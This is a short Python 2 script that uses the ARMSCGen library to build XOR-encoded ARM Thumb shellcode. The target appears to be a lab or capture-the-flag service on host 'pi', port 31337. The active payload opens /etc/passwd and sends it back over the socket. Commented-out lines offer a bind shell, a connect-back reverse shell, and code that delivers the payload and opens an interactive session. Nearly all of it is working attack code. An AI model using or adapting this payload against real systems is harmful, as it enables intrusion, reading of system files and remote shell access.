#!python

from ARMSCGen import *
from socket import *
import telnetlib
import time

HOST = 'pi'
PORT = 31337

def getShellcode():
    #xsc = CompileSC(scgen.bindshell(55559, sock=5, once=False), isThumb=True)
    #xsc = CompileSC(scgen.connectback('127.0.0.1', 4444), isThumb=True)
    sc1 = scgen.open_file('/etc/passwd')
    sc2 = scgen.sendfile('r6', 4)
    xsc = CompileSC( (sc1 + sc2), isThumb=True)
    return MakeXorShellcode(xsc)

scgen = thumbSCGen()
sc = getShellcode()

print sc

#s = socket(AF_INET, SOCK_STREAM)
#s.connect( (HOST, PORT) )
#f = s.makefile('rw', bufsize=0)
#f.write(sc + '\n')
#tn = telnetlib.Telnet()
#tn.sock = s
#tn.interact()
